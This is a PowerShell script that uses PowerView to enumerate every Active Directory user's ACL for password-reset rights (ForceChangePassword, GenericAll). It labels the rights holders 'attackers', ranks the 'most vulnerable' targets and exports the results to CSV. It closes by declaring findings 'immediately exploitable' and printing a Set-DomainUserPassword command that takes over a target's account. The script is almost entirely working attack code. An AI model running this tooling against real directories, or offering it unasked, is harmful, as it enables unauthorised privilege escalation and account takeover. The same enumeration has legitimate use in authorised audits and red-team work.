# Complete Password Reset Scanner - Check ALL Users
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "     COMPLETE PASSWORD RESET SCANNER     " -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Load modules
Import-Module C:\Tools\PowerView.ps1 -Force
Write-Host "[+] PowerView loaded" -ForegroundColor Green

# Get ALL users
Write-Host "[*] Getting ALL domain users..." -ForegroundColor Yellow
$allUsers = Get-DomainUser -Properties SamAccountName, DistinguishedName, Enabled, Title, Department
Write-Host "[+] Found $($allUsers.Count) total users" -ForegroundColor Green

$results = @()
$counter = 0

# Filter out built-in/system accounts to focus on interesting ones
$builtinGroups = @(
    "Domain Admins", "Enterprise Admins", "Account Operators", 
    "Administrators", "Local System", "Exchange Trusted Subsystem",
    "Exchange Windows Permissions", "Organization Management",
    "BUILTIN", "NT AUTHORITY", "SELF", "CREATOR OWNER"
)

Write-Host "[*] Scanning ALL users for password reset permissions..." -ForegroundColor Cyan

foreach ($user in $allUsers) {
    $counter++
    $percent = [math]::Round(($counter / $allUsers.Count) * 100)
    Write-Progress -Activity "Scanning Users" -Status "$counter/$($allUsers.Count) - $percent%" -CurrentOperation $user.SamAccountName -PercentComplete $percent
    
    try {
        $acls = Get-DomainObjectAcl -Identity $user.DistinguishedName -ResolveGUIDs
        
        foreach ($acl in $acls) {
            $isPasswordReset = $false
            $permissionType = ""
            
            # Check for ForceChangePassword
            if ($acl.ObjectAceType -eq "User-Force-Change-Password") {
                $isPasswordReset = $true
                $permissionType = "ForceChangePassword"
            }
            
            # Check by GUID
            if ($acl.ObjectAceType -eq "00299570-246d-11d0-a768-00aa006e0529") {
                $isPasswordReset = $true
                $permissionType = "ForceChangePassword"
            }
            
            # Check for GenericAll
            if ($acl.ActiveDirectoryRights -match "GenericAll") {
                $isPasswordReset = $true
                $permissionType = "GenericAll"
            }
            
            if ($isPasswordReset) {
                # Get who has this permission
                try {
                    $attacker = ConvertFrom-SID $acl.SecurityIdentifier
                }
                catch {
                    $attacker = $acl.SecurityIdentifier
                }
                
                # Check if this is an interesting (non-builtin) account
                $isInteresting = $true
                foreach ($builtin in $builtinGroups) {
                    if ($attacker -match $builtin) {
                        $isInteresting = $false
                        break
                    }
                }
                
                $result = [PSCustomObject]@{
                    TargetUser = $user.SamAccountName
                    TargetEnabled = $user.Enabled
                    TargetTitle = $user.Title
                    TargetDepartment = $user.Department
                    AttackerUser = $attacker
                    Permission = $permissionType
                    IsInteresting = $isInteresting
                    ObjectAceType = if ($acl.ObjectAceType) { $acl.ObjectAceType } else { "N/A" }
                }
                
                $results += $result
            }
        }
    }
    catch {
        # Silent fail for individual users
    }
}

Write-Progress -Activity "Scanning Users" -Completed

# Display ALL results summary
if ($results.Count -gt 0) {
    Write-Host "`n" + "="*70 -ForegroundColor Green
    Write-Host "[+] COMPLETE RESULTS: $($results.Count) password reset permissions found" -ForegroundColor Green
    Write-Host "="*70 -ForegroundColor Green
    
    # 1. Show MOST INTERESTING findings first (regular users who can reset passwords)
    $interesting = $results | Where-Object { $_.IsInteresting -eq $true }
    
    if ($interesting.Count -gt 0) {
        Write-Host "`n[+] MOST INTERESTING FINDINGS: $($interesting.Count)" -ForegroundColor Magenta
        Write-Host "   (Regular users who can reset other users' passwords)" -ForegroundColor Magenta
        Write-Host "-"*70 -ForegroundColor Magenta
        
        $interesting | ForEach-Object {
            Write-Host "  $($_.AttackerUser) -> $($_.TargetUser) ($($_.Permission))" -ForegroundColor Yellow
        }
    } else {
        Write-Host "`n[-] No interesting findings (only built-in/admin groups found)" -ForegroundColor Yellow
    }
    
    # 2. Show summary by attacker
    Write-Host "`n[+] SUMMARY BY PRIVILEGED USER/GROUP:" -ForegroundColor Cyan
    Write-Host "-"*70 -ForegroundColor Cyan
    
    $grouped = $results | Group-Object AttackerUser | Sort-Object Count -Descending
    
    foreach ($group in $grouped) {
        $count = $group.Count
        $percentage = [math]::Round(($count / $allUsers.Count) * 100, 2)
        
        # Color code based on how many users they can reset
        if ($percentage -ge 50) {
            $color = "Red"
        } elseif ($percentage -ge 25) {
            $color = "Yellow"
        } else {
            $color = "White"
        }
        
        Write-Host "  $($group.Name): $count users ($percentage%)" -ForegroundColor $color
    }
    
    # 3. Show which users are MOST VULNERABLE (have many attackers who can reset their password)
    Write-Host "`n[+] MOST VULNERABLE USERS:" -ForegroundColor Red
    Write-Host "   (Users with password reset permissions from multiple sources)" -ForegroundColor Red
    Write-Host "-"*70 -ForegroundColor Red
    
    $vulnerableUsers = $results | Group-Object TargetUser | Sort-Object Count -Descending | Select-Object -First 10
    
    foreach ($vuln in $vulnerableUsers) {
        $attackers = ($results | Where-Object { $_.TargetUser -eq $vuln.Name }).AttackerUser -join ", "
        Write-Host "  $($vuln.Name): $($vuln.Count) different users/groups can reset password" -ForegroundColor Yellow
        Write-Host "    Attackers: $attackers" -ForegroundColor Gray
    }
    
    # 4. Export to CSV
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $csvFile = "All_PasswordReset_$timestamp.csv"
    $results | Export-Csv -Path $csvFile -NoTypeInformation
    Write-Host "`n[+] Complete results exported to: $csvFile" -ForegroundColor Green
    
    # 5. Quick actionable findings
    Write-Host "`n[+] QUICK ACTIONABLE FINDINGS:" -ForegroundColor Cyan
    Write-Host "-"*70 -ForegroundColor Cyan
    
    # Find regular users with ForceChangePassword over other regular users
    $actionable = $interesting | Where-Object { 
        $_.Permission -eq "ForceChangePassword" -and 
        $_.TargetEnabled -eq $true
    } | Group-Object AttackerUser
    
    if ($actionable.Count -gt 0) {
        Write-Host "  You can immediately exploit these:" -ForegroundColor Green
        foreach ($action in $actionable) {
            Write-Host "  - $($action.Name) can reset passwords for $($action.Count) users" -ForegroundColor Green
        }
        
        # Show example exploitation command
        Write-Host "`n  Example exploitation command:" -ForegroundColor White
        Write-Host '  $pass = ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force' -ForegroundColor Gray
        Write-Host '  $cred = New-Object System.Management.Automation.PSCredential("DOMAIN\AttackerUser", (ConvertTo-SecureString "AttackerPassword" -AsPlainText -Force))' -ForegroundColor Gray
        Write-Host '  Set-DomainUserPassword -Identity TargetUser -AccountPassword $pass -Credential $cred -Verbose' -ForegroundColor Gray
    } else {
        Write-Host "  No immediately exploitable ForceChangePassword permissions found." -ForegroundColor Yellow
        Write-Host "  (Only GenericAll found, which requires higher privileges)" -ForegroundColor Yellow
    }
}
else {
    Write-Host "`n[-] No password reset permissions found at all." -ForegroundColor Red
}

Write-Host "`n[*] Scan complete! Checked $($allUsers.Count) users." -ForegroundColor Cyan
